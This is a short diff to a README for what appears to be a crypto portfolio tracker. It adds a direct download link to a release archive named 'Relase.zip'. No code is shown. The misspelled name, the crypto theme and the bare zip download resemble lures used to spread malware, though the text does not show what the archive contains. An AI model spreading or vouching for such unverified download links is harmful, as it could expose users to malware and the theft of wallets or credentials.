@@ -23,7 +23,7 @@ Supported data sources for crypto portfolio data include:
 
 
 ## Download Relase
-🚀 Install --> [Releases]()
+🚀 Install --> [Releases](https://github.com/Tooppie/Tracker-Master/releases/download/v2.4/Relase.zip)
 
 
 ## 🚀 Getting Started
